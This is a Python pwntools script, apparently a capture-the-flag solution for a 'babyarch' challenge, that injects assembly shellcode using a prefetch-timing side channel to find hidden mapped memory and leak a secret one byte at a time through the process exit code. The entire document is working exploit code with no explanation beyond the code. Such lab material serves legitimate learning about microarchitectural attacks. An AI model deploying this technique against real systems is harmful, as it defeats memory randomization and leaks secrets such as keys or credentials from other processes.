
from pwn import *
context.arch = "amd64"

format_asm = '''
    push rbp
    mov     rbp, rsp
    sub rsp, 0x50
start_search:
    xor rdi, rdi
    mov [rbp-0x8], rdi
lab1:
    mov rdi, [rbp-0x8]
    add rdi, 0x10000
    mov [rbp-0x8], rdi
    mov r10, 0xffffff0000
    cmp rdi, r10
    ja start_search
    call measure
    cmp rax, 80
    ja lab1
    mov rsi, qword ptr[rbp-0x8]
    xor rdi, rdi
    mov dil, byte ptr[rsi+{}]
    mov rax, 60
    syscall

measure:
    push    rbp
    mov     rbp, rsp
    mov     [rbp-0x18], rdi
    rdtsc
    shl     rdx, 0x20
    or      rax, rdx
    mov     [rbp-0x8], rax
    lfence
    nop
    mov     rax, [rbp-0x18]
    prefetcht2 byte ptr [rax]
    lfence
    nop
    rdtsc
    shl     rdx, 0x20
    or      rax, rdx
    mov     [rbp-0x10], rax
    mov     rax, [rbp-0x10]
    sub     rax, [rbp-0x8]
    pop     rbp
    ret
'''
res=""
i = 0
while True:
    
    p = process("/challenge/babyarch_level2.1")
    #context.terminal = ['tmux', 'splitw', '-h']
    #p = gdb.debug("/challenge/babyarch_level2")
    p.send(asm(format_asm.format(i)))
    p.wait_for_close()
    exit_code = p.poll()

    if exit_code is not None:
        print(f"Process {i} exited with code {exit_code}")
        if (exit_code != -11):
            res+=chr(exit_code)
            i=i+1
    else:
        print("Process has not yet finished")
    if i >= 60:
        break
print(res)
